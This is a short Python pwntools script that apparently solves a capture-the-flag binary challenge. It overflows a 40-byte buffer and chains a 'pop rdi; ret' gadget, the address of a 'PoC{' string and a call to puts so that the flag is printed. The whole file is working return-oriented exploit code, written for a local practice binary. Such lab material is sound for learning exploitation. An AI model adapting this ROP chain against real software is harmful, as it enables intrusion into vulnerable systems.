#!/usr/bin/env python3

from pwn import *
from typing import Union, List


elf = ELF("./challenge", checksec=False)

def get_gadget(elf: ELF, instructions: Union[list, tuple]) -> bytes:
    gadget = ROP(elf).find_gadget(instructions)
    return p64(gadget.address)

def search_strings(elf: ELF, string: Union[bytes, str]) -> List[bytes]:
    strings = elf.search(bytes(string, 'ascii'))
    return [p64(s) for s in strings]

def search_instructions(elf: ELF, func_name: str, instruction: str, bytes_range=100):
    all_calls = elf.disasm(elf.symbols[func_name], bytes_range).split('\n')

    all_calls_addr = []
    for ins in all_calls:
        if instruction in ins:
            addr_str = ins.split(':')[0].strip()
            all_calls_addr.append(p64(int(addr_str, 16)))
    return all_calls_addr

payload  = cyclic(40)
payload += get_gadget(elf, ['pop rdi', 'ret'])
payload += search_strings(elf, 'PoC{')[0]
payload += search_instructions(elf, "call_this", "call")[0] # call_this<+9>   call <puts@plt>

p = process("./challenge")

p.sendline(payload)

print(p.recvall())
